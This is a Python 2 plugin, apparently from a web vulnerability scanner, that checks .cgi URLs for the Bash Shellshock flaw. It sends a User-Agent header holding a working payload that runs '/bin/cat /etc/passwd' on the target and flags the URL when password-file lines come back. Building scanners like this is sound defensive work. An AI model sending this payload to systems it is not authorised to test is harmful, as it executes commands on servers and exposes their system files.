#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import re

def run_url(http,ob,item):
    print "--==--==-==--==-===----"
    print ob['isstart']
    print "--==--==-==--==-===----"
    detail=""
    list=[]
    try:
        url=item['url'].lower()
       
        if url.find(".cgi")<0:
            return []
        
        headers = {"User-Agent": "() { foo;};echo;/bin/cat /etc/passwd"}
        #response,content = http.request(url,'GET',headers=headers)
        response,content = yx_httplib2_request(http,url,'GET',headers=headers)
        if response['status']=='200' and re.search('/bin/(bash|sh)[^\r\n<>]*[\r\n]', content):
            request = getRequest(url)
            response = getResponse(response)
            if ob['isstart']=='1':
                detail="验证性扫描结果：\n%s\n%s"%(content,detail) 
            list.append(getRecord(ob,item['url'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:Bash_CmdExeScript.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Bash_CmdExeScript.py, run_url function :" + str(e))
    #end try
    
    return list

